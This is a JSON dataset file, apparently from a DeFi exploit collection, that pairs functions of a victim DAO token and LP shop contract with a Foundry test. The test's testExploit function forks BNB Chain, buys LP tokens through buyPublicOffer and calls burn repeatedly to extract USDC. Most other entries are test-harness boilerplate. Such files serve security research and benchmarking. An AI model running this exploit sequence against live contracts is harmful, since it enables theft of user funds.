[
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(address _to, uint256 _amount)\n        external\n        onlyDao\n        returns (bool)\n    {\n        require(burnable, \"DAO: GT burning is disabled\");\n        _burn(_to, _amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address, uint256) public pure override returns (bool) {\n        revert(\"GT: transfer is prohibited\");\n    }\n\n    function transferFrom(\n        address,\n        address,\n        uint256\n    ) public pure override returns (bool) {\n        revert(\"GT: transferFrom is prohibited\");\n    }\n\n    /*----RECEIVE ETH------------------------------------*/\n\n    event Received(address indexed, uint256);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address,\n        address,\n        uint256\n    ) public pure override returns (bool) {\n        revert(\"GT: transferFrom is prohibited\");\n    }\n\n    /*----RECEIVE ETH------------------------------------*/\n\n    event Received(address indexed, uint256);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IUFT",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(\n        address _recipient,\n        address _pool,\n        uint256 _share // multiplied by 1e18, for example 20% = 2e17\n    ) external returns (bool);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 24_705_058);\n        cheats.label(address(shop), \"SHOP\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(UFT), \"UFT\");\n        cheats.label(address(WBNB), \"WBNB\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDC);\n        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(\n            1, path, address(this), block.timestamp\n        );\n        USDC.approve(address(shop), type(uint256).max);\n        uint256 amount = USDC.balanceOf(address(this));\n        shop.buyPublicOffer(UF, amount);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        address[] memory adapters = new address[](0);\n        address[] memory pools = new address[](0);\n        UFT.burn(amount, tokens, adapters, pools);\n        amount = 1000 * 1e18;\n        shop.buyPublicOffer(UF, amount);\n        UFT.burn(amount, tokens, adapters, pools);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "SHOP",
    "source_type": "victim_contract",
    "function_name": "buyPublicOffer",
    "original_code": "    function buyPublicOffer(address _dao, uint256 _lpAmount)\n        external\n        nonReentrant\n        returns (bool)\n    {\n        require(\n            IFactory(factory).containsDao(_dao),\n            \"Shop: only DAO can sell LPs\"\n        );\n\n        PublicOffer memory publicOffer = publicOffers[_dao];\n\n        require(publicOffer.isActive, \"Shop: this offer is disabled\");\n\n        IERC20(publicOffer.currency).safeTransferFrom(\n            msg.sender,\n            _dao,\n            (_lpAmount * publicOffer.rate) / 1e18\n        );\n\n        address lp = IDao(_dao).lp();\n\n        bool b = ILP(lp).mint(msg.sender, _lpAmount);\n\n        require(b, \"Shop: mint error\");\n\n        return true;\n    }\n\n",
    "description": ""
  }
]